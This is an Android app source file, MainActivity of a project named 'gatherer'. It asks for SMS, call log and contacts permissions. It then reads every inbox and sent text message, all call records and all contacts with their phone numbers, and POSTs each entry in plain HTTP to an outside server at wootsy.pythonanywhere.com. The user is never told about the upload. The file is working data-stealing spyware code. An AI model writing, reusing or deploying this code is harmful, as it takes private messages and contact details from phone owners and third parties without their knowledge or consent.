package com.example.alex.gatherer;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.StrictMode;
import android.provider.ContactsContract;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;
import android.database.Cursor;
import android.widget.Toast;

import com.example.alex.gatherer.R;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int READ_TEXTS_PERMISSIONS_REQUEST = 1;
    private static final int READ_CALLS_PERMISSIONS_REQUEST = 2;
    private static final int REQ_READ_CONTACTS = 100;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);



        // request text access
        requestPermissions(new String[]{Manifest.permission.READ_SMS},
                READ_TEXTS_PERMISSIONS_REQUEST);
        // request call log access
        requestPermissions(new String[]{Manifest.permission.READ_CALL_LOG},
                READ_CALLS_PERMISSIONS_REQUEST);
        //request contacts access
        requestPermissions(new String[]{Manifest.permission.READ_CONTACTS},
                REQ_READ_CONTACTS);

    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String permissions[], int[] grantResults) {
        switch (requestCode) {
            case READ_TEXTS_PERMISSIONS_REQUEST: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    // array of all texts
                    List<String> texts = new ArrayList<>();

                    // inbox cursor
                    Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

                    if (cursor.moveToFirst()) { // must check the result to prevent exception
                        do {
                            String msgData = "";
                            for(int idx=0;idx<cursor.getColumnCount();idx++)
                            {
                                msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                            }
                            texts.add(msgData);
                        } while (cursor.moveToNext());
                    } else {
                        System.out.println("No messages found");
                    }
                    cursor.close();

                    // sent cursor
                    cursor = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
                    if (cursor.moveToFirst()) { // must check the result to prevent exception
                        do {
                            String msgData = "";
                            for(int idx=0;idx<cursor.getColumnCount();idx++)
                            {
                                msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                            }
                            texts.add(msgData);
                        } while (cursor.moveToNext());
                    } else {
                        System.out.println("No messages found");
                    }
                    cursor.close();

                    for (String t : texts) {
                        sendToServer(t);
                    }

                } else {

                    // permission denied, boo! Disable the
                    // functionality that depends on this permission.
                }

                return;
            }
            case READ_CALLS_PERMISSIONS_REQUEST: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    // array of all texts
                    List<String> calls = new ArrayList<>();

                    // inbox cursor
                    Cursor cursor = getContentResolver().query(Uri.parse("content://call_log/calls"), null, null, null, null);

                    if (cursor.moveToFirst()) { // must check the result to prevent exception
                        do {
                            String msgData = "";
                            for(int idx=0;idx<cursor.getColumnCount();idx++)
                            {
                                msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                            }
                            calls.add(msgData);
                        } while (cursor.moveToNext());
                    } else {
                        System.out.println("No messages found");
                    }
                    cursor.close();



                    for (String t : calls) {
                        sendToServer(t);
                    }

                } else {

                    // permission denied, boo! Disable the
                    // functionality that depends on this permission.
                }

                return;
            }
            case REQ_READ_CONTACTS:
                if(grantResults[0] == PackageManager.PERMISSION_GRANTED){
                    getContacts();
                }
                else{
                    Toast.makeText(getApplicationContext(), "Cannot run app without access to contacts.", Toast.LENGTH_LONG);
                }

            // other 'case' lines to check for other
            // permissions this app might request
        }
    }

    protected void getContacts(){
            ContentResolver cr = getContentResolver();
            Cursor phone = cr.query(ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null);
            if(phone == null){
                Toast.makeText(getApplicationContext(), "ERROR could not create cursor.", Toast.LENGTH_LONG);
                return;
            }
            Cursor conCursor;
            String id, name, number;
            String contact = "";
            while(phone != null && phone.moveToNext()){
                name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                id = phone.getString(phone.getColumnIndex(ContactsContract.Contacts._ID));

                contact += name + ":";

                if(phone.getInt(phone.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0){
                    conCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id},
                            null);
                    while(conCursor.moveToNext()){
                        number = conCursor.getString(conCursor.getColumnIndex((ContactsContract.CommonDataKinds.Phone.NUMBER)));
                        contact += number + " ";
                    }
                    conCursor.close();
                }
                contact += '\n';
                sendToServer(contact);


            }
            phone.close();
    }


    public void sendToServer(String msg) {
        try {

            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
                    .permitAll().build();
            StrictMode.setThreadPolicy(policy);
            String toSend = msg;
            String urlParameters = "message=" + toSend;
            String request = "http://wootsy.pythonanywhere.com";
            URL url = new URL(request);

            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setInstanceFollowRedirects(false);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Content-Length", "" + Integer.toString(urlParameters.getBytes().length));
            connection.setUseCaches(false);

            DataOutputStream wr = new DataOutputStream(connection.getOutputStream());
            wr.writeBytes(urlParameters);
            connection.getInputStream();
            wr.flush();
            wr.close();
            connection.disconnect();

        } catch(Exception e) {
            e.printStackTrace();
        }

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
